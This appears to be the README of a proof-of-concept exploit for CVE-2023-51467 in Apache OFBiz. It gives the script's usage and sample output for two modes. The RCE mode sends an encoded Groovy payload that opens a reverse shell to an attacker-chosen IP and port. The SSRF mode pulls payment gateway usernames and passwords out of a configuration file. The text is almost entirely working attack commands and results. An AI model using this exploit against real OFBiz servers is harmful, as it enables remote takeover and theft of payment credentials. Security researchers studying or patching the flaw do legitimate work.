# PoC CVE-2023-51467
## Environment Setup
Tested with Apache OFBiz 18.12.11 with OpenJDK 11
```
python poc.py -h
usage: poc.py [-h] -u URL [-t {SSRF,RCE}] [-i IP] [-p PORT] [-j JSON]

POC for CVE-2023-51467

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target to exploit.
  -t {SSRF,RCE}, --task {SSRF,RCE}
                        Task to carry out.

RCE:
  -i IP, --ip IP        Reverse shell IP
  -p PORT, --port PORT  Reverse shell Port

SSRF:
  -j JSON, --json JSON  json payload file
```

## RCE
```
./poc.py -u https://127.0.0.1:8443 -i 127.0.0.1 -t RCE
[+] Target is vulnerable.
[*] Running RCE exploit.
{'groovyProgram': 'x="\'CiAgICAgICAgICAgIGltcG9ydCBqYXZheC5zY3JpcHQuKjsKCiAgICAgICAg
...<snipped>...
Y2tUcmFjZSgpOyB9CiAgICAgICAg\'.de";Eval.me(new String(Eval.me("${x}codeBase64()")));'}
```
## SSRF
```
./poc.py -u https://127.0.0.1:8443 -j payload.json -t SSRF
[+] Target is vulnerable.
[*] Running SSRF exploit.
{'requiredLabels': '{"file:applications/accounting/config/payment.properties": ["payment.verisign.user", "payment.verisign.pwd", "payment.verisign.vendor"]}'}
[+] Exploit sent.
b'{"file:applications/accounting/config/payment.properties":["[PayFlow UserID]","[PayFlow Password]","[Vendor]"]}'
[*] Done.
```
## References
- https://vulncheck.com/blog/ofbiz-cve-2023-51467
- https://xz.aliyun.com/t/13211 (RacerZ)